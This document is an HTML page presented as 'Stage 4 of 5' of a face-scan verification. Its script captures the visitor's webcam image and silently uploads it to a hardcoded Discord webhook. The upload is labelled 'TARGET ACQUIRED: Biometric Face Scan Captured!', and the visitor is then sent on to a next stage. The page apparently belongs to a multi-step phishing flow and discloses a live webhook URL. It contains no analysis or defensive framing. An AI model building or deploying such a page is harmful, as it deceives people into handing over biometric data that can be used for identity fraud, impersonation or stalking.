<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>STAGE 4</title>
  <style>
    * { box-sizing: border-box; }
    body { background-color: #f5f2eb; color: #2d3748; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 24px; }
    .stage-badge { font-size: 14px; font-weight: 700; letter-spacing: 2px; color: #718096; text-transform: uppercase; margin-bottom: 16px; }
    .card { background: #ffffff; border: 1px solid #e2e8f0; box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05); padding: 40px; border-radius: 16px; width: 100%; max-width: 520px; text-align: center; }
    h2 { color: #1a202c; margin-top: 0; font-size: 26px; margin-bottom: 24px; }
    .circle-viewport { width: 220px; height: 220px; border-radius: 50%; border: 4px solid #2b6cb0; overflow: hidden; margin: 0 auto 28px auto; background: #000; box-shadow: 0 4px 14px rgba(0,0,0,0.1); }
    video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
    button { padding: 16px 28px; background: #2b6cb0; color: white; border: none; font-size: 18px; font-weight: 600; cursor: pointer; border-radius: 10px; width: 100%; transition: background 0.2s; }
    button:hover { background: #2c5282; }
    button:disabled { background: #a0aec0; cursor: not-allowed; }
  </style>
</head>
<body>

  <div class="stage-badge">STAGE 4 OF 5</div>

  <div class="card">
    <h2>[ CONFIRM FACE SCAN ]</h2>

    <div class="circle-viewport">
      <video id="webcam" autoplay playsinline muted></video>
    </div>

    <button id="snapBtn" onclick="takeSnapshot()">CONFIRM FACE SCAN</button>
  </div>

  <script>
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1554196200784134204/DuLlXIKYd4f_cmfK9IlJRnRD7mocTmYzc0oBL76ID2bny_KPRz_FdPm7L12zqobSjFsk";
    const video = document.getElementById('webcam');
    const snapBtn = document.getElementById('snapBtn');

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => { video.srcObject = stream; })
      .catch(err => { alert("Camera access required to perform scan."); });

    function takeSnapshot() {
      snapBtn.disabled = true;
      snapBtn.innerText = "SCANNING & ACQUIRING...";

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append('content', '🎯 **TARGET ACQUIRED: Biometric Face Scan Captured!**');
        formData.append('file', blob, 'face_scan.jpg');

        fetch(DISCORD_WEBHOOK_URL, {
          method: 'POST',
          body: formData
        }).finally(() => {
          window.location.href = "stage5.html";
        });
      }, 'image/jpeg');
    }
  </script>
</body>
</html>
